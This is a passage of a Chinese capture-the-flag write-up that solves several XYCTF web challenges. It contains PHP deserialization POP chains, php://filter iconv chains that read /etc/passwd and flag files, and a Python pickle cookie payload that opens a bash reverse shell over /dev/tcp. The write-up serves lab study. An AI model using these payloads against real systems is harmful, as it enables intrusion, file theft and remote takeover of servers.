<span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>构造链子<strong>E()::__wakeup()-&gt;D()::__toString-&gt;B()::__get()-&gt;A()::__invoke()-&gt;C()::__call()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num-&gt;lao = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;num-&gt;lao-&gt;luo-&gt;mack = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>saber_master_saber_master.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>命令执行在，<code>echo new $_POST['X']($_POST['Y']);</code><br />
好，又是原生类，这次是比较熟悉的，它还告诉了我们要读取<code>flag.php</code><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121780909">https://blog.csdn.net/unexpectedthing/article/details/121780909</a><br />
<code>POST: X=SplFileObject&amp;Y=php://filter/read=convert.base64-encode/resource=flag.php</code><br />
入口是XYCTFNO3::__wakeup()<br />
然后关键就到了这<code>if ($this-&gt;adwa-&gt;crypto0 != 'dev1l' or $this-&gt;adwa-&gt;T1ng != 'yuroandCMD258')</code><br />
虽然<code>crypto0</code>和<code>Ting</code>不属于同一个类，但我们可以自己把它构造出来，这就需要对序列化和反序列化有所了解了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span> = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span> = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KickyMu-&gt;adwa = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="web-连连看到底是连连什么看"><a class="markdownIt-Anchor" href="#web-连连看到底是连连什么看"></a> Web 连连看到底是连连什么看</h2>
<p>看源码，去<strong>what’s_this.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>你甚至能找到差不多的原题，<strong>hscctf2024，ImaginaryCTF Round 28 - Filter Master</strong>，不过这题加了过滤</p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/tree/main</a></p>
<p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/index.html">https://lazzzaro.github.io/2024/03/11/match-HSCCTF-2024/index.html</a></p>
<p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH</a></p>
<p>跟上面的ezLFI很像，但是这种方法读出来的数据会带有很多的脏数据，我们运行ezLFI的脚本可以发现，而且此处是强比较，所以不能带有脏数据<br />
<img src="https://picx.zhimg.com/80/v2-1dd60a035f4c74cf642f5057c2a29e37_1440w.png" alt="" /></p>
<p><img src="https://pic1.zhimg.com/80/v2-4f763de0bb79649e5a35fe9b49094f6e_1440w.png" alt="" /><br />
基于tjjj分享的这两点，我们对<code>XYCTF</code>进行多次base64编码，每次记得删除<code>=</code>，然后每编码一次记得补上一次解码，这个方法是可以剔除脏数据的<br />
经过尝试需要6次编码，拿到最后的<code>Vm0xd1ExbFhUWGhUYTJSWVlURndXVlpXUlE</code><br />
在这里，我们使用到的工具是这个<br />
<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd</span></span><br></pre></td></tr></table></figure>
<p>得到的p再补上6个<code>|convert.base64-decode</code></p>
<p>复现的时候发现了，确实直接对<code>XYCTF</code>使用工具，会出现大量的乱码在<code>XYCTF</code>后面，那除了多次base64编码，还有什么办法解决呢？<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134627841">https://blog.csdn.net/m0_73512445/article/details/134627841</a><br />
根据base64的特性，需要让<code>XYCTF</code>的长度满足三的倍数关系，多加一个<code>&lt;</code>，最后配合<code>string.strip_tags</code>过滤器剔除垃圾字符，即剔除<code>&lt;</code>后面的所有垃圾字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/what<span class="string">&#x27;s_this.php?p=convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags</span></span><br></pre></td></tr></table></figure>
<h2 id="web-login"><a class="markdownIt-Anchor" href="#web-login"></a> Web login</h2>
<p>flag登录就送？登陆不上啊，尝试看看有没有注册页面，发现<code>register.php</code><br />
登陆后，页面没什么信息，但是它的cookie值好奇怪，<code>RememberMe</code>?不会是<code>Shiro反序列化漏洞吧</code><br />
再看值<code>gASVMAAAAAAAAACMA2FwcJSMBUxvZ2lulJOUKYGUfZQojARuYW1llIwBYZSMA3B3ZJSMAzEyM5R1Yi4=</code>，base64解密之后可以看见用户信息，那就是<strong>Pickle反序列化</strong>喽</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/116274988">https://blog.csdn.net/weixin_45669205/article/details/116274988</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>
<p>常用的__reduce__魔术方法waf了<br />
换个方法<br />
<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a><br />
正好弹个shell试试</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure>
<p><strong>payload打回cookie的RememberMe中</strong></p>
<h2 id="web-pharme"><a class="markdownIt-Anchor" href="#web-pharme"></a> Web pharme</h2>
<p>跳转<code>class.php</code></p>
